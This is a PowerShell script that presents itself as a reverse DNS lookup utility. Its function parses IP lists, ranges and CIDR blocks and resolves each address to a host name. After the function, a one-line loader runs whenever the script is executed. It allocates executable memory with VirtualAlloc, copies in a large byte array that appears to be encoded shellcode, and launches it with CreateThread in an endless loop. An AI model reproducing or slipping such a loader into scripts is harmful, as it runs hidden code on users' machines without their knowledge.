function Invoke-ReverseDnsLookup
{


    Param (
        [Parameter(Position = 0, Mandatory = $True,ValueFromPipeline=$True)]
        [String]
        $IpRange
    )

    BEGIN {
    
        function Parse-IPList ([String] $IpRange)
        {
        
            function IPtoInt
            {
                Param([String] $IpString)
            
                $Hexstr = ""
                $Octets = $IpString.Split(".")
                foreach ($Octet in $Octets) {
                        $Hexstr += "{0:X2}" -f [Int] $Octet
                }
                return [Convert]::ToInt64($Hexstr, 16)
            }
        
            function InttoIP
            {
                Param([Int64] $IpInt)
                $Hexstr = $IpInt.ToString("X8")
                $IpStr = ""
                for ($i=0; $i -lt 8; $i += 2) {
                        $IpStr += [Convert]::ToInt64($Hexstr.SubString($i,2), 16)
                        $IpStr += '.'
                }
                return $IpStr.TrimEnd('.')
            }
        
            $Ip = [System.Net.IPAddress]::Parse("127.0.0.1")
        
            foreach ($Str in $IpRange.Split(","))
            {
                $Item = $Str.Trim()
                $Result = ""
                $IpRegex = "\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}"
            
                
                switch -regex ($Item)
                {
                    "^$IpRegex/\d{1,2}$"
                    {
                        $Result = "cidrRange"
                        break
                    }
                    "^$IpRegex-$IpRegex$"
                    {
                        $Result = "range"
                        break
                    }
                    "^$IpRegex$"
                    {
                        $Result = "single"
                        break
                    }
                    default
                    {
                        Write-Warning "Inproper input"
                        return
                    }
                }
            
                
                switch ($Result)
                {
                    "cidrRange"
                    {
                        $CidrRange = $Item.Split("/")
                        $Network = $CidrRange[0]
                        $Mask = $CidrRange[1]
                    
                        if (!([System.Net.IPAddress]::TryParse($Network, [ref] $Ip))) { Write-Warning "Invalid IP address supplied!"; return}
                        if (($Mask -lt 0) -or ($Mask -gt 30)) { Write-Warning "Invalid network mask! Acceptable values are 0-30"; return}
                    
                        $BinaryIP = [Convert]::ToString((IPtoInt $Network),2).PadLeft(32,'0')
                        
                        $Lower = $BinaryIP.Substring(0, $Mask) + "0" * ((32-$Mask)-1) + "1"
                        
                        $Upper = $BinaryIP.Substring(0, $Mask) + "1" * ((32-$Mask)-1) + "0"
                        $LowerInt = [Convert]::ToInt64($Lower, 2)
                        $UpperInt = [Convert]::ToInt64($Upper, 2)
                        for ($i = $LowerInt; $i -le $UpperInt; $i++) { InttoIP $i }
                    }
                    "range"
                    {
                        $Range = $item.Split("-")
                    
                        if ([System.Net.IPAddress]::TryParse($Range[0],[ref]$Ip)) { $Temp1 = $Ip }
                        else { Write-Warning "Invalid IP address supplied!"; return }
                    
                        if ([System.Net.IPAddress]::TryParse($Range[1],[ref]$Ip)) { $Temp2 = $Ip }
                        else { Write-Warning "Invalid IP address supplied!"; return }
                    
                        $Left = (IPtoInt $Temp1.ToString())
                        $Right = (IPtoInt $Temp2.ToString())
                    
                        if ($Right -gt $Left) {
                            for ($i = $Left; $i -le $Right; $i++) { InttoIP $i }
                        }
                        else { Write-Warning "Invalid IP range. The right portion must be greater than the left portion."; return}
                    
                        break
                    }
                    "single"
                    {
                        if ([System.Net.IPAddress]::TryParse($Item,[ref]$Ip)) { $Ip.IPAddressToString }
                        else { Write-Warning "Invalid IP address supplied!"; return }
                        break
                    }
                    default
                    {
                        Write-Warning "An error occured."
                        return
                    }
                }
            }
        
        }
    }
    
    PROCESS {
        Parse-IPList $IpRange | ForEach-Object {
            try {
                Write-Verbose "Resolving $_"
                $Temp = [System.Net.Dns]::GetHostEntry($_)
            
                $Result = @{
                    IP = $_
                    HostName = $Temp.HostName
                }
            
                New-Object PSObject -Property $Result
            } catch [System.Net.Sockets.SocketException] {}
        }
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbb,0x71,0xf1,0x87,0x89,0xda,0xd0,0xd9,0x74,0x24,0xf4,0x5f,0x2b,0xc9,0xb1,0x47,0x83,0xef,0xfc,0x31,0x5f,0x0f,0x03,0x5f,0x7e,0x13,0x72,0x75,0x68,0x51,0x7d,0x86,0x68,0x36,0xf7,0x63,0x59,0x76,0x63,0xe7,0xc9,0x46,0xe7,0xa5,0xe5,0x2d,0xa5,0x5d,0x7e,0x43,0x62,0x51,0x37,0xee,0x54,0x5c,0xc8,0x43,0xa4,0xff,0x4a,0x9e,0xf9,0xdf,0x73,0x51,0x0c,0x21,0xb4,0x8c,0xfd,0x73,0x6d,0xda,0x50,0x64,0x1a,0x96,0x68,0x0f,0x50,0x36,0xe9,0xec,0x20,0x39,0xd8,0xa2,0x3b,0x60,0xfa,0x45,0xe8,0x18,0xb3,0x5d,0xed,0x25,0x0d,0xd5,0xc5,0xd2,0x8c,0x3f,0x14,0x1a,0x22,0x7e,0x99,0xe9,0x3a,0x46,0x1d,0x12,0x49,0xbe,0x5e,0xaf,0x4a,0x05,0x1d,0x6b,0xde,0x9e,0x85,0xf8,0x78,0x7b,0x34,0x2c,0x1e,0x08,0x3a,0x99,0x54,0x56,0x5e,0x1c,0xb8,0xec,0x5a,0x95,0x3f,0x23,0xeb,0xed,0x1b,0xe7,0xb0,0xb6,0x02,0xbe,0x1c,0x18,0x3a,0xa0,0xff,0xc5,0x9e,0xaa,0xed,0x12,0x93,0xf0,0x79,0xd6,0x9e,0x0a,0x79,0x70,0xa8,0x79,0x4b,0xdf,0x02,0x16,0xe7,0xa8,0x8c,0xe1,0x08,0x83,0x69,0x7d,0xf7,0x2c,0x8a,0x57,0x33,0x78,0xda,0xcf,0x92,0x01,0xb1,0x0f,0x1b,0xd4,0x2c,0x15,0x8b,0x17,0x18,0x14,0x61,0xf0,0x5b,0x17,0x64,0x5c,0xd5,0xf1,0xd6,0x0c,0xb5,0xad,0x96,0xfc,0x75,0x1e,0x7e,0x17,0x7a,0x41,0x9e,0x18,0x50,0xea,0x34,0xf7,0x0d,0x42,0xa0,0x6e,0x14,0x18,0x51,0x6e,0x82,0x64,0x51,0xe4,0x21,0x98,0x1f,0x0d,0x4f,0x8a,0xf7,0xfd,0x1a,0xf0,0x51,0x01,0xb1,0x9f,0x5d,0x97,0x3e,0x36,0x0a,0x0f,0x3d,0x6f,0x7c,0x90,0xbe,0x5a,0xf7,0x19,0x2b,0x25,0x6f,0x66,0xbb,0xa5,0x6f,0x30,0xd1,0xa5,0x07,0xe4,0x81,0xf5,0x32,0xeb,0x1f,0x6a,0xef,0x7e,0xa0,0xdb,0x5c,0x28,0xc8,0xe1,0xbb,0x1e,0x57,0x19,0xee,0x9e,0xab,0xcc,0xd6,0xd4,0xc5,0xcc;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

